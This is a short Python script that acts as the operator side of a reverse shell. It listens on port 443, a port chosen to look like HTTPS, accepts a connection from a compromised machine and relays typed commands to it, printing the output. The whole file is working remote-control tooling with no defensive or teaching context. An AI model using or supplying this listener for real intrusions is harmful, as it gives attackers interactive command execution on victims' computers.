#!/usr/bin/env python3

import subprocess
import socket

if __name__ == "__main__":
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # This is to reuse the socket in case of a crash
    server_socket.bind(("192.168.1.128", 443))
    server_socket.listen()
    print("[+] Listening for incoming connections")
    client_socket, client_address = server_socket.accept()
    print("[+] Connection established")   

    while True:
        command = input("Shell> ")
        client_socket.send(command.encode())
        command_output = client_socket.recv(1024).decode()
        print(command_output)
        
    server_socket.close()
